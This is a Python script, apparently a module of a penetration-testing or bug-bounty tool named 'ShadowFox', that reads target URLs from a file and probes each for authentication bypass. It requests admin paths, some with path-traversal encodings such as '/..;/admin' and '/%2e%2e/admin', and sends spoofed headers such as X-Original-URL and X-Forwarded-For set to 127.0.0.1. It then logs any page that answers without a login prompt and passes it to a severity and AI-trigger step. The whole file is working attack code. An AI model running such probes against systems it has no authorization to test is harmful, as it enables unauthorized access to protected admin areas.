import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def test_auth_bypass(url):
    paths = [
        "/admin", "/admin.php", "/admin/login", "/dashboard", "/private",
        "/..;/admin", "/%2e%2e/admin", "/admin?access=1", "/panel"
    ]

    headers_list = [
        {"X-Original-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"}
    ]

    user_agent = {"User-Agent": "ShadowFox-AuthBypass"}

    for path in paths:
        test_url = url.rstrip("/") + path
        try:
            r = requests.get(test_url, headers=user_agent, timeout=6)
            if r.status_code == 200 and "login" not in r.text.lower():
                log_to_text(f"[AUTH-BYPASS] {test_url} (no headers)")
                severity = classify_severity(r.text)
                ai_trigger_if_needed("Auth Bypass", test_url, "No headers", r.text, severity)
                print(f"[+] Mogući auth bypass: {test_url}")
        
        except Exception as e:
            print(f"[-] Greška: {e}")

    for custom_headers in headers_list:
        headers = {**user_agent, **custom_headers}
        try:
            r = requests.get(url, headers=headers, timeout=6)
            if r.status_code == 200 and "login" not in r.text.lower():
                log_to_text(f"[AUTH-BYPASS] {url} -> Header: {custom_headers}")
                severity = classify_severity(r.text)
                ai_trigger_if_needed("Auth Bypass", url, str(custom_headers), r.text, severity)
                print(f"[+] Auth bypass sa headerom: {custom_headers}")
        
        except Exception as e:
            print(f"[-] Greška: {e}")

    print("[-] Auth bypass testiranje završeno.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        targets = f.read().splitlines()
    
    for url in targets:
        test_auth_bypass(url)
